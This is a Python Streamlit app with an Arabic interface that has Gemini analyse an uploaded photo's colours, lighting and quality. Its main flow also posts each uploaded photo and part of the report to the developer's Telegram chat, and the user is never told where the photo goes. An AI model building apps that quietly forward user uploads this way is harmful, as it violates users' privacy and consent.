import streamlit as st
import google.generativeai as genai
from PIL import Image
import io
import requests
import time

# 1. إعدادات الصفحة والجماليات (CSS)
st.set_page_config(page_title="Aziz Ultra-Max AI", page_icon="🚀", layout="centered")

st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&family=Reenie+Beanie&display=swap');
    
    .main {
        background-color: #0e1117;
    }
    .stTitle {
        color: #00d4ff;
        font-family: 'Cairo', sans-serif;
        text-align: center;
        text-shadow: 2px 2px 4px #000000;
    }
    .welcome-text {
        color: #ffffff;
        text-align: center;
        font-size: 20px;
        margin-bottom: 30px;
    }
    /* ستايل التوقيع الخاص بك */
    .signature {
        font-family: 'Reenie Beanie', cursive;
        font-size: 40px;
        color: #00d4ff;
        text-align: center;
        margin-top: 50px;
        border-top: 1px solid #333;
        padding-top: 20px;
    }
    </style>
    """, unsafe_allow_html=True)

# 2. الواجهة والترحيب
st.markdown('<h1 class="stTitle">🚀 Aziz Ultra-Max AI</h1>', unsafe_allow_html=True)
st.markdown('<p class="welcome-text">أهلاً بك في منصتك الخاصة.. ارفع الصورة واترك الباقي عليّ!</p>', unsafe_allow_html=True)

# 3. جلب المفاتيح من Secrets
GOOGLE_API_KEY = st.secrets["GOOGLE_API_KEY"]
TELEGRAM_TOKEN = st.secrets["TELEGRAM_TOKEN"]
CHAT_ID = st.secrets["CHAT_ID"]

genai.configure(api_key=GOOGLE_API_KEY)

# 4. خانة الرفع (أوتوماتيكية)
uploaded_file = st.file_uploader("", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    image = Image.open(uploaded_file)
    st.image(image, caption="📸 جاري العمل على صورتك...", use_container_width=True)
    
    progress_bar = st.progress(0)
    for percent_complete in range(100):
        time.sleep(0.01)
        progress_bar.progress(percent_complete + 1)

    with st.spinner("🔍 يتم الآن تحليل الألوان والإضاءة..."):
        try:
            # استخدام الموديل المستقر
            model = genai.GenerativeModel('gemini-1.5-pro')
            
            prompt = "حلل هذه الصورة تقنياً: الألوان، الإضاءة، الجودة، واقترح تحسينات لجعلها 4K بأسلوب احترافي ومختصر."
            response = model.generate_content([prompt, image])
            
            # تحويل الصورة لبيانات
            img_byte_arr = io.BytesIO()
            image.save(img_byte_arr, format=image.format if image.format else 'JPEG')
            img_data = img_byte_arr.getvalue()
            
            # إرسال لتيليجرام
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
            files = {'photo': img_data}
            payload = {
                'chat_id': CHAT_ID,
                'caption': f"🎯 Aziz Ultra-Max Report:\n\n{response.text[:1000]}"
            }
            requests.post(url, files=files, data=payload)
            
            st.balloons()
            st.success("✅ تم التحليل والإرسال بنجاح!")
            
            with st.expander("📊 عرض التقرير الفني"):
                st.markdown(response.text)
            
        except Exception as e:
            st.error(f"❌ حدث خطأ: {e}")

# 5. توقيعك في أسفل الموقع
st.markdown('<div class="signature">Created by: Aziz</div>', unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #555; font-size: 12px;'>جميع الحقوق محفوظة © 2026</p>", unsafe_allow_html=True)